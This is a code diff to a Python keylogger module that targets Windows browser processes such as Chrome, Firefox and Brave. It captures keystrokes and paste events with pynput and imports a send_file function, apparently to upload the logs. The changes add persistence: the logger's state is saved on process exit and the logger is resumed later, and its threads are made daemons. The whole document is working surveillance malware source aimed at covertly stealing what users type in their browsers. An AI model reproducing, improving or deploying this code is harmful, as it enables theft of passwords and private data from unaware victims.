@@ -1,5 +1,6 @@
 from .drive import send_file
 from logger import log
+import atexit
 import time
 from queue import Empty, Queue
 from threading import Event, Thread
@@ -12,21 +13,20 @@ import win32process
 from pynput.keyboard import Key
 
 from .keyboard import BrowserHotKeys
+from .util import data_store
 
 
+session="klogger_session"
 browsers=("iexplore.exe", "chrome.exe", "firefox.exe", "Yandex.exe", "opera.exe", "UCBrowser.exe", "Brave.exe")
 
-class Any:
+class Any_process:
     def __contains__(self, item):
         return True
 
 class Keyloger:
-    def __init__(self, command_sec, max_size:"MB"=3, targets:Tuple=browsers):
-        log.info(f'key logger started for {targets}')
-        log.debug(f"command_sec: {command_sec}, max_size: {max_size}")
-
-        self.command_sec=command_sec
-        self.targets = targets or Any()
+    def __init__(self):
+        self.command_sec=-1
+        self.targets = set()
         self.keys={
             "<ctrl>+v":self.paste,
             "<shift>+<insert>":self.paste
@@ -36,10 +36,10 @@ class Keyloger:
         self.log = Event()
         self.log.clear()
 
-        self.left_size = max_size*1048576
+        self.left_size = 0# size in bytes
         self._running = False
 
-        self.smell_bowser = Thread(target=self.watch_dog, name='browser_detector')
+        self.smell_bowser:Thread = None
         self.listener:BrowserHotKeys = None
 
     def watch_dog(self):
@@ -57,6 +57,7 @@ class Keyloger:
                 self.log.clear()
             time.sleep(.25)
         
+        data_store.reset(session)
         self.stop()
 
     def paste(self):
@@ -99,8 +100,8 @@ class Keyloger:
         if self.running:
             return
         
-        self.smell_bowser = Thread(target=self.watch_dog, name='browser_detector')
-        Thread(target=self.key_log, name="key_listener").start()
+        self.smell_bowser = Thread(target=self.watch_dog, name='browser_detector', daemon=True)
+        Thread(target=self.key_log, name="key_listener", daemon=True).start()
         
         self._running = True
         self.smell_bowser.start()
@@ -109,6 +110,19 @@ class Keyloger:
         with BrowserHotKeys(self.keys, self.on_press) as listener:
             self.listener = listener
             listener.join()
+
+    def save_and_stop(self):
+        if not self.running:
+            return 
+        
+        log.info('pausing key logger.')
+        most_obious={
+            "command_sec":self.command_sec,
+            "left_size":self.left_size,
+            "targets":None if type(self.targets) is Any_process else self.targets
+        }
+        data_store.set_value(session, most_obious)
+        self.stop()
 
     def stop(self):
         if not self.running:
@@ -127,6 +141,44 @@ class Keyloger:
     def running(self):
         return self._running
         # return self.smell_bowser.is_alive() and self._running
+
+
+default_logger=Keyloger()
+atexit.register(default_logger.save_and_stop)
+
+def attach_to_logger(command_sec, left_size:"bytes", targets):
+    log.debug(f"command_sec: {command_sec}, max_size in bytes: {left_size}")
+    if default_logger.running:
+        default_logger.stop()
+
+        default_logger.command_sec=command_sec
+        default_logger.left_size+=left_size
+        if type(default_logger.targets) is set:
+            log.info(f'targets extended with {targets} ')
+            default_logger.targets.update(targets)
+        
+        default_logger.start()
+        return 
+    # for now ignoring the situation where logger not running as well as not resumed
+
+    log.info(f'key logger started for {targets}')
+    default_logger.command_sec=command_sec
+    default_logger.left_size=left_size
+    default_logger.targets = targets or Any_process()
+    default_logger.start()
+
+def start_logger(command_sec, max_size:"MB"=3, targets=browsers):
+    log.info(f'key logger started for {targets}')
+    log.debug(f"command_sec: {command_sec}, max_size: {max_size}")
+    attach_to_logger(command_sec, max_size*1048576, targets)
+
+def resume_keylogger():
+    kwargs=getattr(data_store.var, session)
+    if not kwargs.get('left_size', 0)>0:
+        return
+
+    log.info(f'restarting key logger')
+    attach_to_logger(**kwargs)
 
 
 if __name__=="__main__":
